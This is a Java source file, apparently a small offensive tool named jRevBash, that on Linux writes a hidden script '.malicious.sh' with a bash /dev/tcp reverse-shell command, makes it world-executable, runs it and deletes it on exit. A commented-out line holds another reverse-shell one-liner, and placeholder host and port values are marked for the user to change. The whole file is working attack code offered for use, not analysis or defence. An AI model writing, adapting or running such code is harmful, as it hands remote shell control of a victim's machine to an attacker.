import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;


public class jRevBash {
	//Declare host and ip	
	static String host = "127.0.0.1"; //TODO CHANGE ME
	static String port = "31337"; //TODO CHANGE ME
	
	private static boolean linBash() {
		//TODO add support for multiple other shells
		//Create runtime environment
		Runtime r = Runtime.getRuntime();
		Process p = null;

		//Create a print writer that creates .malicious.sh with /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1
		try {
			PrintWriter malicious = new PrintWriter(".malicious.sh", "UTF-8");
			malicious.println("/bin/bash -i >& /dev/tcp/"+ host + "/" + port + "0>&1");
			malicious.close();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		//TODO better variable names and malicious filename
		//Open .malicious.sh and set it to delete on exit
		File mal = new File(".malicious.sh");
		mal.deleteOnExit();

		//chmod 777
		mal.setExecutable(true, false);
		mal.setReadable(true, false);
		mal.setWritable(true, false);

		try {
			//Execute .malicious.sh
			p = r.exec("bash .malicious.sh".toString());
			//TODO ISSUE #1: Investigate why the following crashes java as it is a much cleaner solution.
			//p = r.exec("/bin/bash  -i > /dev/tcp/127.0.0.1/31337 0<&1 2>&1");
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
		try {
			p.waitFor();
		} catch (InterruptedException e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}

	public static void main(String args[]){
		//Get OS name
		String OS = System.getProperty("os.name");
		//TODO Test/create on OSX, BSD's, *nix
		//If Linux then create bash reverse shell
		if(OS.equals("Linux")){
			linBash();
		}
	}
}
